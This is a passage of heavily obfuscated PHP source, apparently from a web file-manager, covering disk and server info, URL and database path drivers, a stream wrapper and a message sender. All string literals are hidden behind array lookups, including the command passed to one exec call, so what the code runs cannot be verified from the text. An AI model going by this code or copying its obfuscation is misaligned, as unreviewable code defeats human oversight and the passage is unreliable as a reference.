$«ÇÇØô[$âÂ’²Ïî[982]]; if ($Òı®ì®¬ == $âÂ’²Ïî[970]) { $·Œú• = explode($âÂ’²Ïî[1278], $«ÇÇØô[$âÂ’²Ïî[981]]); $Òı®ì®¬ = $·Œú•[0]; } if ($Òı®ì®¬ == $âÂ’²Ïî[918] || $Òı®ì®¬ == $âÂ’²Ïî[817]) { $‡şû·¸› = Model()->db()->query($âÂ’²Ïî[1820]); $ƒ¯¶Óì = $‡şû·¸›[0] && isset($‡şû·¸›[0][$âÂ’²Ïî[1561]]) ? $‡şû·¸›[0][$âÂ’²Ïî[1561]] : 0; $Òı®ì®¬ = $âÂ’²Ïî[1821] . ($ƒ¯¶Óì ? $âÂ’²Ïî[8] . $ƒ¯¶Óì : $âÂ’²Ïî[12]); } $ÉêÌËÜ• = $GLOBALS[$âÂ’²Ïî[6]][$âÂ’²Ïî[358]][$âÂ’²Ïî[840]]; return array($âÂ’²Ïî[1822] => $¸Ÿí€ ? $¸Ÿí€[$âÂ’²Ïî[1823]] : 0, $âÂ’²Ïî[1824] => $¸Ÿí€ ? $¸Ÿí€[$âÂ’²Ïî[1825]] : 0, $âÂ’²Ïî[1826] => (int) $éíĞˆÄê[$âÂ’²Ïî[1823]] * 1024 * 1024 * 1024, $âÂ’²Ïî[1827] => (int) $ù°ÖÀ”›, $âÂ’²Ïî[1828] => ucfirst($ùÇÉ‚™Ã), $âÂ’²Ïî[1829] => $âÂ’²Ïî[1830] . PHP_VERSION, $âÂ’²Ïî[1831] => phpBuild64() ? 64 : 32, $âÂ’²Ïî[771] => str_replace($âÂ’²Ïî[1136], $âÂ’²Ïî[998], $Òı®ì®¬), $âÂ’²Ïî[358] => ucfirst($ÉêÌËÜ•), $âÂ’²Ïî[32] => $_SERVER[$âÂ’²Ïî[1832]]); } private function diskDriver() { $Ò¨àè¼û =& $_SERVER[ Ö‘ñÄ”]; $÷ÚúŸ ¿ = $Ò¨àè¼û[8]; $„ËÆÌÛ£ = $GLOBALS[$Ò¨àè¼û[6]][$Ò¨àè¼û[1294]] == $Ò¨àè¼û[1295]; if ($„ËÆÌÛ£) { $÷ÚúŸ ¿ = $Ò¨àè¼û[1833]; if (function_exists($Ò¨àè¼û[1834])) { exec($Ò¨àè¼û[1835], $˜êñ¦¼); $÷ÚúŸ ¿ = $˜êñ¦¼[1] . $Ò¨àè¼û[8]; } } if (!file_exists($÷ÚúŸ ¿)) { return; } $†Âñì±Ù = @disk_total_space($÷ÚúŸ ¿); $»ˆ˜·âË = $†Âñì±Ù - @disk_free_space($÷ÚúŸ ¿); return array($Ò¨àè¼û[1823] => $†Âñì±Ù, $Ò¨àè¼û[1825] => $»ˆ˜·âË); } public function fileChart($—ÈĞ¯¸) { $Ÿ®Û—Õ¸ =& $_SERVER[ Ö‘ñÄ”]; if (isset($—ÈĞ¯¸[$Ÿ®Û—Õ¸[1663]])) { return Model($Ÿ®Û—Õ¸[838])->userFileTypeProfile($—ÈĞ¯¸[$Ÿ®Û—Õ¸[1663]]); } if (isset($—ÈĞ¯¸[$Ÿ®Û—Õ¸[1836]])) { return Model($Ÿ®Û—Õ¸[838])->groupFileTypeProfile($—ÈĞ¯¸[$Ÿ®Û—Õ¸[1836]]); } $Ô—¼ØƒÙ = $this->sourceSize(); $†õ›Ö¼ = array($Ÿ®Û—Õ¸[440] => 0, $Ÿ®Û—Õ¸[419] => 1); $‚ÖºõÓ– = Model($Ÿ®Û—Õ¸[838])->where($†õ›Ö¼)->sum($Ÿ®Û—Õ¸[76]); $†õ›Ö¼[$Ÿ®Û—Õ¸[419]] = 2; $Ê”ìÕ° = Model($Ÿ®Û—Õ¸[838])->where($†õ›Ö¼)->sum($Ÿ®Û—Õ¸[76]); return array($Ÿ®Û—Õ¸[776] => $Ô—¼ØƒÙ[$Ÿ®Û—Õ¸[76]], $Ÿ®Û—Õ¸[1770] => $Ô—¼ØƒÙ[$Ÿ®Û—Õ¸[1770]], $Ÿ®Û—Õ¸[1771] => (int) $‚ÖºõÓ–, $Ÿ®Û—Õ¸[1772] => (int) $Ê”ìÕ°); } private function sourceSize() { $¤ª¯Û¹Ç =& $_SERVER[ Ö‘ñÄ”]; $é‹¯»ö¶ = Model($¤ª¯Û¹Ç[838])->where(array($¤ª¯Û¹Ç[418] => 0))->sum($¤ª¯Û¹Ç[76]); $›‡Ù¨°­ = Model($¤ª¯Û¹Ç[479])->sum($¤ª¯Û¹Ç[76]); if ($›‡Ù¨°­ > $é‹¯»ö¶) { $›‡Ù¨°­ = $é‹¯»ö¶; } return array($¤ª¯Û¹Ç[76] => (int) $é‹¯»ö¶, $¤ª¯Û¹Ç[1770] => (int) $›‡Ù¨°­); } } goto b˜Ëæà­Æ; EŸ©Ğ¹§¨: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($½ÌæÂÚÈ = false) { } public function exist($œîÁá—) { $á‘Ã¸ôå = $this->info($œîÁá—); return $á‘Ã¸ôå[$_SERVER[ Ö‘ñÄ”][201]]; } public function isFile($¹¹¿ãƒ) { $ŠÚû•—· = $this->info($¹¹¿ãƒ); return $ŠÚû•—·[$_SERVER[ Ö‘ñÄ”][201]]; } public function isFolder($êºã‡) { return !1; } public function size($¡“Å¶Ø) { $ãÇÈ›¶» = $this->info($¡“Å¶Ø); return $ãÇÈ›¶»[$_SERVER[ Ö‘ñÄ”][76]]; } public function info($ëÃÊ…Ä) { return $this->infoParse($ëÃÊ…Ä); } public function infoAuth($èş­´±¨) { return $this->infoParse($èş­´±¨); } public function infoWithChildren($¡çú·±‡) { return $this->infoParse($¡çú·±‡); } public function infoFull($ß´ğïºÍ) { return $this->infoParse($ß´ğïºÍ); } private function infoParse($€œİµ‰Î) { $°Äòî‰ =& $_SERVER[ Ö‘ñÄ”]; $°ÍóÔõ = $this->header($€œİµ‰Î); if (!$°ÍóÔõ || !$°ÍóÔõ[$°Äòî‰[763]]) { return !1; } $ü—¿‘Ç = _get($°ÍóÔõ, $°Äòî‰[346], 0); $Ï‰ÇÑ¢ = array($°Äòî‰[32] => $°ÍóÔõ[$°Äòî‰[32]], $°Äòî‰[84] => $€œİµ‰Î, $°Äòî‰[33] => $°Äòî‰[199], $°Äòî‰[76] => intval($ü—¿‘Ç), $°Äòî‰[174] => get_path_ext($°ÍóÔõ[$°Äòî‰[32]]), $°Äòî‰[1384] => $ü—¿‘Ç > 0 && $°ÍóÔõ[$°Äòî‰[1506]], $°Äòî‰[1385] => !1); return $Ï‰ÇÑ¢; } private function header($ÃüòË†ö) { $¡°Ñ¿î¼ =& $_SERVER[ Ö‘ñÄ”]; if (isset(self::$_cacheHeader[$ÃüòË†ö])) { return self::$_cacheHeader[$ÃüòË†ö]; } $ÑÏ®äÍŠ = isset($GLOBALS[$¡°Ñ¿î¼[1507]]) ? $GLOBALS[$¡°Ñ¿î¼[1507]] : !1; $GLOBALS[$¡°Ñ¿î¼[1507]] = !0; self::$_cacheHeader[$ÃüòË†ö] = url_header($ÃüòË†ö); $GLOBALS[$¡°Ñ¿î¼[1507]] = $ÑÏ®äÍŠ; return self::$_cacheHeader[$ÃüòË†ö]; } public function hashSimple($ÇµŒ¾ßı, $Å¯êãìª = false) { $è–·úÔ =& $_SERVER[ Ö‘ñÄ”]; $£Çıíº = $this->info($ÇµŒ¾ßı); if (!$£Çıíº || !$£Çıíº[$è–·úÔ[201]]) { return !1; } $õ´ùıÍ­ = $£Çıíº[$è–·úÔ[76]]; $»¨…¼æà = 200; $«åøë²í = 50; if ($õ´ùıÍ­ <= $»¨…¼æà * $«åøë²í) { return md5($this->fileSubstr($ÇµŒ¾ßı, 0, $õ´ùıÍ­)) . $õ´ùıÍ­; } $½ºƒ™ = intval($õ´ùıÍ­ / $«åøë²í); $ˆöÙ¹ÚŞ = $è–·úÔ[12]; $‰‚„‘» = timeFloat(); $€©™Ù¾ù = 15; for ($Å´²ºï  = 0; $Å´²ºï  < $«åøë²í; $Å´²ºï ++) { if (timeFloat() - $‰‚„‘» > $€©™Ù¾ù) { return !1; } $ ˜—ñÙº = $this->fileSubstr($ÇµŒ¾ßı, $½ºƒ™ * $Å´²ºï , $»¨…¼æà); if (!$ ˜—ñÙº) { return !1; } $ˆöÙ¹ÚŞ .= $ ˜—ñÙº; } $ˆöÙ¹ÚŞ .= $this->fileSubstr($ÇµŒ¾ßı, $õ´ùıÍ­ - $»¨…¼æà, $»¨…¼æà); return md5($ˆöÙ¹ÚŞ) . $õ´ùıÍ­; } public function getContent($ÕŞôÜ¼è) { return $this->fileSubstr($ÕŞôÜ¼è); } public function fileSubstr($Ë¹Ÿ¿Ş, $Š¦–Í© = 0, $¸¢€äŞ¦ = -1) { $Æ’üş³õ =& $_SERVER[ Ö‘ñÄ”]; $ˆÎ¥ŞºÏ = $this->info($Ë¹Ÿ¿Ş); if (!$ˆÎ¥ŞºÏ || !$ˆÎ¥ŞºÏ[$Æ’üş³õ[201]] && $ˆÎ¥ŞºÏ[$Æ’üş³õ[76]] > 1024 * 1024 * 10) { return !1; } if ($¸¢€äŞ¦ === -1) { $¸¢€äŞ¦ = $ˆÎ¥ŞºÏ[$Æ’üş³õ[76]]; } if ($¸¢€äŞ¦ == 0) { return $Æ’üş³õ[12]; } $ú‡Üòª° = array($Æ’üş³õ[1508] . $Š¦–Í© . $Æ’üş³õ[795] . ($Š¦–Í© + $¸¢€äŞ¦ - 1)); $—ñ¯¿´× = url_request($Ë¹Ÿ¿Ş, $Æ’üş³õ[230], !1, $ú‡Üòª°, !1, !1, 1); return $—ñ¯¿´×[$Æ’üş³õ[1199]] ? $—ñ¯¿´×[$Æ’üş³õ[1199]] : $Æ’üş³õ[12]; } public function download($–óÑæÙÈ, $˜¬Í¡ƒÑ) { Downloader::start($–óÑæÙÈ, $˜¬Í¡ƒÑ); return $˜¬Í¡ƒÑ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($²…úùÉê, $ƒóÉÖŞÛ = '') { $this->info = $this->info($²…úùÉê); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ Ö‘ñÄ”][84]]; $this->pathOpen = $²…úùÉê; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$²…úùÉê])) { self::$_chunkBuffer[$²…úùÉê] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ÈõÏä‰÷) { $Õûµ¦» = $this->fileSubstr($this->pose, $ÈõÏä‰÷); $this->pose += strlen($Õûµ¦»); return $Õûµ¦»; } public function stream_tell() { return $this->pose; } public function stream_seek($¼ÂÂ²áÊ, $ï ¼À’) { $Ä¤™‘éÕ =& $_SERVER[ Ö‘ñÄ”]; if ($ï ¼À’ == SEEK_SET) { $this->pose = $¼ÂÂ²áÊ; } else { if ($ï ¼À’ == SEEK_CUR) { $this->pose += $¼ÂÂ²áÊ; } else { if ($ï ¼À’ == SEEK_END) { $this->pose = $this->info[$Ä¤™‘éÕ[76]] + intval($¼ÂÂ²áÊ); } } } if ($¼ÂÂ²áÊ < 0) { $this->pose = $this->info[$Ä¤™‘éÕ[76]] + $¼ÂÂ²áÊ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ Ö‘ñÄ”][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ş¡âıµô, $Ğëıì„) { $Ãô¿úšü =& $_SERVER[ Ö‘ñÄ”]; $àåö½“ = $this->info($Ş¡âıµô); return array($Ãô¿úšü[1509] => 0, $Ãô¿úšü[1510] => 0, $Ãô¿úšü[16] => 32768 + 511, $Ãô¿úšü[1511] => 0, $Ãô¿úšü[1512] => 0, $Ãô¿úšü[1513] => 0, $Ãô¿úšü[1514] => 0, $Ãô¿úšü[76] => $àåö½“[$Ãô¿úšü[76]], $Ãô¿úšü[1515] => $àåö½“[$Ãô¿úšü[1383]], $Ãô¿úšü[1471] => $àåö½“[$Ãô¿úšü[85]], $Ãô¿úšü[1470] => $àåö½“[$Ãô¿úšü[200]], $Ãô¿úšü[1516] => 0, $Ãô¿úšü[1517] => 0); } static $fileInfo = array(); public function info($”Î¤ÎÏŠ) { $ÜÍïˆñ± = $_SERVER[ Ö‘ñÄ”][1518]; if (isset(self::$fileInfo[$”Î¤ÎÏŠ])) { return self::$fileInfo[$”Î¤ÎÏŠ]; } if (substr($”Î¤ÎÏŠ, 0, strlen($ÜÍïˆñ±)) != $ÜÍïˆñ±) { return !1; } self::$fileInfo[$”Î¤ÎÏŠ] = IO::info(substr($”Î¤ÎÏŠ, strlen($ÜÍïˆñ±))); return self::$fileInfo[$”Î¤ÎÏŠ]; } public static function read($ôœ×í¬¹, $‘×Ûò”¨, $Šæ³ğèß) { if (!isset(self::$_fopenCache[$ôœ×í¬¹])) { $…‚×€£ç = new StreamWrapperIO(); $…‚×€£ç->stream_open($ôœ×í¬¹); self::$_fopenCache[$ôœ×í¬¹] = $…‚×€£ç; } $…‚×€£ç = self::$_fopenCache[$ôœ×í¬¹]; return $…‚×€£ç->fileSubstr($‘×Ûò”¨, $Šæ³ğèß); } public static function _read($¦ğ“ÆÚ±, $¾¿ú¬´‚, $±’¤²ÏÄ) { $Óœ ¥±è =& $_SERVER[ Ö‘ñÄ”]; $ÔÙôºİ« = fopen($¦ğ“ÆÚ±, $Óœ ¥±è[1387]); if (!$ÔÙôºİ«) { return $Óœ ¥±è[12]; } $õÉáµĞ = 8192; fseek($ÔÙôºİ«, $¾¿ú¬´‚, SEEK_SET); $ÁùÛ§´İ = $Óœ ¥±è[12]; $–«¶Â = 0; while ($–«¶Â < $±’¤²ÏÄ) { $ú½¦ÛŸş = min($õÉáµĞ, $±’¤²ÏÄ - $–«¶Â); $ÁùÛ§´İ .= fread($ÔÙôºİ«, $ú½¦ÛŸş); $–«¶Â += $ú½¦ÛŸş; } fclose($ÔÙôºİ«); return $ÁùÛ§´İ; } public function fileSubstr($Œö—Û¹´, $Ğ‰‡Œ´„) { $äÖÙŞ§ =& $_SERVER[ Ö‘ñÄ”]; $ì¯ê„Üš = $this->info[$äÖÙŞ§[76]]; $¦¨š¼Ì = $Œö—Û¹´; $ÂåÇ‰ÂØ = $Ğ‰‡Œ´„; if ($Œö—Û¹´ < 0) { $Œö—Û¹´ = $ì¯ê„Üš + $Œö—Û¹´; } if ($Ğ‰‡Œ´„ === !1) { $Ğ‰‡Œ´„ = $ì¯ê„Üš - $Œö—Û¹´; } if ($Œö—Û¹´ + $Ğ‰‡Œ´„ > $ì¯ê„Üš) { $Ğ‰‡Œ´„ = $ì¯ê„Üš - $Œö—Û¹´; } if ($Ğ‰‡Œ´„ <= 0) { return $äÖÙŞ§[12]; } if ($Œö—Û¹´ < 0 || $Œö—Û¹´ >= $ì¯ê„Üš || $Ğ‰‡Œ´„ <= 0 || $Ğ‰‡Œ´„ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\154\x65\122\x65\141\x64\40\145\162\162\x6f\162\x21\40\163\164\141\162\x74\75{$Œö—Û¹´}\x3b\154\x65\x6e\x67\x74\150\x3d{$Ğ‰‡Œ´„}\73\x20\x73\151\x7a\x65\75{$ì¯ê„Üš}\x3b"); } $¢ıøÒÍ = 64 * 1024; $–Ûì´µ =& self::$_chunkBuffer[$this->path]; if (!$–Ûì´µ) { $–Ûì´µ = array(); } $—ñÑ·Öö = 0; $—­ÙœÇ‘ = 0; $çÒäï¦ = $äÖÙŞ§[12]; foreach ($–Ûì´µ as $—ñÑ·Öö => $çÒäï¦) { $—ñÑ·Öö = intval($—ñÑ·Öö); $—­ÙœÇ‘ = $—ñÑ·Öö + strlen($çÒäï¦); if ($Œö—Û¹´ >= $—­ÙœÇ‘) { continue; } if ($Œö—Û¹´ >= $—ñÑ·Öö && $Œö—Û¹´ + $Ğ‰‡Œ´„ <= $—­ÙœÇ‘) { return substr($çÒäï¦, $Œö—Û¹´ - $—ñÑ·Öö, $Ğ‰‡Œ´„); } break; } if (count($–Ûì´µ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($äÖÙŞ§[1519], $äÖÙŞ§[1520] . count($–Ûì´µ) . "\x3b\x73\x74\x61\x72\x74\x3d{$Œö—Û¹´}\x2c\154\x65\x6e\x67\164\x68\x3d{$Ğ‰‡Œ´„}\x3b\160\x6f\163\145\72{$—ñÑ·Öö}\176{$—­ÙœÇ‘}"); throw new Exception($äÖÙŞ§[1521]); } $»¦÷êÍ÷ = intval($Œö—Û¹´ / $¢ıøÒÍ) * $¢ıøÒÍ; $êÖŠÅ´× = ceil(($Œö—Û¹´ + $Ğ‰‡Œ´„) / $¢ıøÒÍ) * $¢ıøÒÍ - $»¦÷êÍ÷; $Ï€Ú‘„© = IO::fileSubstr($this->path, $»¦÷êÍ÷, $êÖŠÅ´×); $–Ûì´µ[$»¦÷êÍ÷ . $äÖÙŞ§[12]] = $Ï€Ú‘„©; ksort($–Ûì´µ); $ïÙøàè = substr($Ï€Ú‘„©, $Œö—Û¹´ - $»¦÷êÍ÷, $Ğ‰‡Œ´„); return $ïÙøàè; } private function log($µüÌ ¾, $áò¯‹Ğ) { $å­©›º =& $_SERVER[ Ö‘ñÄ”]; $è—ŸÃ®Ò = timeFloat() - $this->timeStart; write_log(sprintf($å­©›º[1522], $µüÌ ¾, $this->info[$å­©›º[32]], $è—ŸÃ®Ò, $áò¯‹Ğ), $å­©›º[1189]); } } class Message { function __construct() { } public function send($É¯áƒÀù = '', $­…ğıªÈ = array(), $ˆ®éô£à = "\x74\145\170\x74") { $‡Û²Ÿñ =& $_SERVER[ Ö‘ñÄ”]; $ê¼÷ó†ø = array($‡Û²Ÿñ[33] => $‡Û²Ÿñ[1523], $‡Û²Ÿñ[768] => $É¯áƒÀù); if (in_array($ˆ®éô£à, array($‡Û²Ÿñ[1523], $‡Û²Ÿñ[1524]))) { $ê¼÷ó†ø[$‡Û²Ÿñ[33]] = $ˆ®éô£à; } $­…ğıªÈ = array($‡Û²Ÿñ[523] => isset($­…ğıªÈ[$‡Û²Ÿñ[523]]) ? $­…ğıªÈ[$‡Û²Ÿñ[523]] : $‡Û²Ÿñ[12], $‡Û²Ÿñ[608] => isset($­…ğıªÈ[$‡Û²Ÿñ[608]]) ? $­…ğıªÈ[$‡Û²Ÿñ[608]] : $‡Û²Ÿñ[12]); if (empty($É¯áƒÀù) || empty($­…ğıªÈ[$‡Û²Ÿñ[523]]) && empty($­…ğıªÈ[$‡Û²Ÿñ[608]])) { return !1; } $ÉÎïŞˆç = array($‡Û²Ÿñ[1464] => $ê¼÷ó†ø, $‡Û²Ÿñ[1525] => $­…ğıªÈ); Hook::trigger($‡Û²Ÿñ[1526], $ÉÎïŞˆç); } } goto b¹µÏ®ëä; AËÓª†ŠÌ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($µ‘œ¸›) { $this->pathParse = $µ‘œ¸›; $this->model = Model($_SERVER[ Ö‘ñÄ”][1333]); } public function getPath($Ÿ¨›İâø) { return trim($Ÿ¨›İâø, $_SERVER[ Ö‘ñÄ”][8]); } public function pathFather($¿¾„ïİ) { $èâ£¯Œ» = $this->parse($¿¾„ïİ); $èâ£¯Œ» = $this->infoSimple($¿¾„ïİ); return $èâ£¯Œ» ? $èâ£¯Œ»[$_SERVER[ Ö‘ñÄ”][440]] : !1; } public function pathThis($´Å±É‘) { $Òô€ÙÒ· = $this->infoSimple($´Å±É‘); return $Òô€ÙÒ· ? $Òô€ÙÒ·[$_SERVER[ Ö‘ñÄ”][32]] : !1; } public function getPathOuter($œ”‰üË±) { if (!$œ”‰üË±) { return $œ”‰üË±; } $®½®¿Æ = $this->parse($œ”‰üË±); return KodIO::make($®½®¿Æ[$_SERVER[ Ö‘ñÄ”][407]]); } public function copyFolderFromIO($î¥“¾Ì, $İÈô¯Ÿ, $¦ÇÚ‹Ã, $‡«Ò–å³, $©Ë¶À¡) { $ß±¨Öı = $this->model->copyFolderFromIO($î¥“¾Ì, $İÈô¯Ÿ, $¦ÇÚ‹Ã, $‡«Ò–å³, $©Ë¶À¡); return KodIO::make($ß±¨Öı); } public function isParentOf($àş…ËÅÇ, $ÎÌü®Ï§) { return $this->model->isParentOf($àş…ËÅÇ, $ÎÌü®Ï§); } public function mkfile($ˆË˜ôÁì, $‹¸ç¥« = '', $ë¿ïûË¿ = REPEAT_RENAME) { $ÁÃíê©Ç =& $_SERVER[ Ö‘ñÄ”]; $Ã“ºËİ = $this->parse($ˆË˜ôÁì); $ˆË˜ôÁì = $Ã“ºËİ[$ÁÃíê©Ç[407]]; for ($ŸØá‘³ = 0; $ŸØá‘³ < count($Ã“ºËİ[$ÁÃíê©Ç[1334]]); $ŸØá‘³++) { $öÚ›é„ = $Ã“ºËİ[$ÁÃíê©Ç[1334]][$ŸØá‘³]; if ($ŸØá‘³ == count($Ã“ºËİ[$ÁÃíê©Ç[1334]]) - 1) { $ˆË˜ôÁì = $this->model->mkfile($ˆË˜ôÁì, $öÚ›é„, $‹¸ç¥«, $ë¿ïûË¿); break; } $ˆË˜ôÁì = $this->model->mkdir($ˆË˜ôÁì, $öÚ›é„, REPEAT_SKIP); } return $this->getPathOuter($ˆË˜ôÁì); } public function mkdir($Øæ›íÌ, $¬àí™€Å = REPEAT_SKIP) { $•ºêã·Ü =& $_SERVER[ Ö‘ñÄ”]; $¯û°šŠ = $this->parse($Øæ›íÌ); $Øæ›íÌ = $¯û°šŠ[$•ºêã·Ü[407]]; for ($¿Ó·ıÈ‰ = 0; $¿Ó·ıÈ‰ < count($¯û°šŠ[$•ºêã·Ü[1334]]); $¿Ó·ıÈ‰++) { $ğÁ›ü = $¯û°šŠ[$•ºêã·Ü[1334]][$¿Ó·ıÈ‰]; $Øæ›íÌ = $this->model->mkdir($Øæ›íÌ, $ğÁ›ü, $¬àí™€Å); } return $this->getPathOuter($Øæ›íÌ); } public function copyFile($ÕäêÒøå, $ê©Îû‡›, $ò™×¬– = REPEAT_REPLACE) { $Ì„ªšÀû =& $_SERVER[ Ö‘ñÄ”]; $‰·ãÄÙÂ = $this->parse($ê©Îû‡›); $ÑİÓê– = $this->model->copy($ÕäêÒøå, $‰·ãÄÙÂ[$Ì„ªšÀû[407]], $ò™×¬–, $‰·ãÄÙÂ[$Ì„ªšÀû[84]]); return $ÑİÓê– ? $this->getPathOuter($ÑİÓê–) : !1; } public function moveFile($¡ÛÆ˜£‡, $¶‡İ¥ŠÜ, $ğ†úÔ = REPEAT_REPLACE) { $Çåó÷ =& $_SERVER[ Ö‘ñÄ”]; $àÛ·ÛòÕ = $this->parse($¶‡İ¥ŠÜ); $Œæ…óÃ× = $this->model->move($¡ÛÆ˜£‡, $àÛ·ÛòÕ[$Çåó÷[407]], $ğ†úÔ, $àÛ·ÛòÕ[$Çåó÷[84]]); return $Œæ…óÃ× ? $this->getPathOuter($Œæ…óÃ×) : !1; } public function copy($ÃÍ‰öèÊ, $ÅíœÓ­¸, $üñßñÑø = REPEAT_REPLACE, $¡ïùâç = false) { $§›æ£¤Õ = $this->parse($ÅíœÓ­¸); $°“ğş©ó = $this->model->copy($ÃÍ‰öèÊ, $§›æ£¤Õ[$_SERVER[ Ö‘ñÄ”][407]], $üñßñÑø, $¡ïùâç); return $°“ğş©ó ? $this->getPathOuter($°“ğş©ó) : !1; } public function moveSameAllow() { } public function move($¹ÀíÈ‡, $Òîã¼â, $÷°ø“Š = REPEAT_REPLACE, $—ßœË“Ç = false) { $ú¾ëĞù = $this->parse($Òîã¼â); $ü²Ù¤ÂÜ = $this->model->move($¹ÀíÈ‡, $ú¾ëĞù[$_SERVER[ Ö‘ñÄ”][407]], $÷°ø“Š, $—ßœË“Ç); return $ü²Ù¤ÂÜ ? $this->getPathOuter($ü²Ù¤ÂÜ) : !1; } public function remove($…š×—¦Š, $åõŠˆÃ´ = true) { return $this->model->remove($…š×—¦Š, $åõŠˆÃ´); } public function rename($Ãù¥Ùä, $ˆí÷µÆ¡) { $ÄÏ˜ãˆ = $this->model->rename($Ãù¥Ùä, $ˆí÷µÆ¡); return $ÄÏ˜ãˆ ? $this->getPathOuter($Ãù¥Ùä) : $ÄÏ˜ãˆ; } public function size($• òË£½) { $µº¶ù»Ä = $this->infoSimple($• òË£½); return $µº¶ù»Ä ? $µº¶ù»Ä[$_SERVER[ Ö‘ñÄ”][76]] : 0; } public function infoSimple($ÊÍËÍ) { return $this->model->sourceInfo($ÊÍËÍ); } public function info($–ç‰÷ù¸) { return $this->infoParse($–ç‰÷ù¸); } public function infoAuth($±â½±Ş) { return $this->infoParse($±â½±Ş, !1, !0); } public function infoWithChildren($Ş°«Æñ) { return $this->infoParse($Ş°«Æñ, !0); } protected function infoParse($ªó¥’•, $Ùú©â™² = false, $–Ï±èÚ„ = false) { if (!$Ùú©â™²) { return $this->model->pathInfo($ªó¥’•, $–Ï±èÚ„); } return $this->model->pathInfoMore($ªó¥’•); } public function infoFull($Âò¥ø»Â) { $šäò™ò™ =& $_SERVER[ Ö‘ñÄ”]; $„¸¶ÍËì = explode($šäò™ò™[8], $Âò¥ø»Â); $ÑÈ¢±§ = implode($šäò™ò™[8], array_splice($„¸¶ÍËì, 1)); return $this->model->pathInfoByPath($„¸¶ÍËì[0], $ÑÈ¢±§); } public function hashSimple($ğù„ÒøÀ) { $Ø×í½§Ó =& $_SERVER[ Ö‘ñÄ”]; $ò™öªÚ = $this->infoWithChildren($ğù„ÒøÀ); return $ò™öªÚ[$Ø×í½§Ó[170]][$Ø×í½§Ó[177]]; } public function hashMd5($áç¹«¸) { $ÂèÉ«ˆ÷ =& $_SERVER[ Ö‘ñÄ”]; $¤‚‚çû– = $this->infoWithChildren($áç¹«¸); return $¤‚‚çû–[$ÂèÉ«ˆ÷[170]][$ÂèÉ«ˆ÷[176]]; } public function exist($îòÒ—») { $ãİÑ‡à =& $_SERVER[ Ö‘ñÄ”]; $ì®¼ª×š = $this->parse($îòÒ—»); if (!$ì®¼ª×š[$ãİÑ‡à[84]]) { return $this->isFile($îòÒ—») || $this->isFolder($îòÒ—»); } $ÀùÆšğš = array($ãİÑ‡à[409] => $ì®¼ª×š[$ãİÑ‡à[407]], $ãİÑ‡à[32] => $ì®¼ª×š[$ãİÑ‡à[84]]); $ê‚Ã¨ÈÑ = $this->model->where($ÀùÆšğš)->find(); return $ê‚Ã¨ÈÑ ? !0 : !1; } public function isFile($ÊğüÒ×è) { $ÙÒÒ²âø =& $_SERVER[ Ö‘ñÄ”]; $¨í·î·§ = $this->infoSimple($ÊğüÒ×è); return $¨í·î·§ && $¨í·î·§[$ÙÒÒ²âø[418]] == $ÙÒÒ²âø[88] ? !1 : !0; } public function isFolder($Ö˜£äÇñ) { $şø»×ßğ =& $_SERVER[ Ö‘ñÄ”]; $œ˜¯›ŠÓ = $this->infoSimple($Ö˜£äÇñ); return $œ˜¯›ŠÓ && $œ˜¯›ŠÓ[$şø»×ßğ[418]] == $şø»×ßğ[88] ? !0 : !1; } public function listPath($½¦›ÏçÏ, $øÌŸ²ğ = false) { $¬Ñë›ˆÍ =& $_SERVER[ Ö‘ñÄ”]; if ($½¦›ÏçÏ == $¬Ñë›ˆÍ[12]) { return !1; } $²¶å±¬€ = array($¬Ñë›ˆÍ[409] => $½¦›ÏçÏ); if ($øÌŸ²ğ) { return $this->model->listSource($²¶å±¬€, -1); } return $this->model->listSource($²¶å±¬€); } public function has($è¡¬âÅğ, $óÓí¦¿Ä = false, $¥œïØÀÅ = null) { $ƒ«ç¼¿¿ =& $_SERVER[ Ö‘ñÄ”]; $É±·Š© = $this->infoWithChildren($è¡¬âÅğ); if ($óÓí¦¿Ä) { return array($ƒ«ç¼¿¿[208] => $É±·Š©[$ƒ«ç¼¿¿[208]], $ƒ«ç¼¿¿[207] => $É±·Š©[$ƒ«ç¼¿¿[207]]); } return $¥œïØÀÅ ? $É±·Š©[$ƒ«ç¼¿¿[208]] : $É±·Š©[$ƒ«ç¼¿¿[207]]; } public function listAll($ó³Çü€Î) { $İÇ»Ò™â = IO::info($this->pathParse[$_SERVER[ Ö‘ñÄ”][84]]); if (!$İÇ»Ò™â) { return array(); } return $this->model->listAll($ó³Çü€Î); } public function getContent($í…ğË”) { return $this->model->getContent($í…ğË”); } public function setContent($‘‘§äçã, $¦³¨Äå = '') { return $this->model->setContent($‘‘§äçã, $¦³¨Äå); } public function fileSubstr($É¬Ì±ù, $¨·È£ñĞ, $ñ¢ëÌâø) { return $this->model->fileSubstr($É¬Ì±ù, $¨·È£ñĞ, $ñ¢ëÌâø); } public function download($î½âñÀß, $©Â×‡š¥ = '') { $ì¾üûŠº = get_path_father($©Â×‡š¥); $­µ›„àÈ = get_path_this($©Â×‡š¥); $÷¸……àˆ = $this->model->fileInfoGet($î½âñÀß); $•ÜÅ²Áö = IO::copy($÷¸……àˆ[$_SERVER[ Ö‘ñÄ”][84]], $ì¾üûŠº, !1, $­µ›„àÈ); return $•ÜÅ²Áö; } public function setModifyTime($¾á¼÷¾è, $Ô±œ†‚ = '') { $—æ„¯ÃÅ =& $_SERVER[ Ö‘ñÄ”]; if (!$¾á¼÷¾è) { return; } $this->model->where(array($—æ„¯ÃÅ[425] => $¾á¼÷¾è))->save(array($—æ„¯ÃÅ[85] => $Ô±œ†‚)); } public function upload($İ¾¡ôó¶, $“ø‹ç, $Áı¿úçå = false, $ íÓâË  = REPEAT_REPLACE) { $Ëî¸š÷¦ =& $_SERVER[ Ö‘ñÄ”]; $†Û“ßš = $this->parse($İ¾¡ôó¶); $Ç€»€‰ = $this->model->addFile($†Û“ßš[$Ëî¸š÷¦[407]], $“ø‹ç, 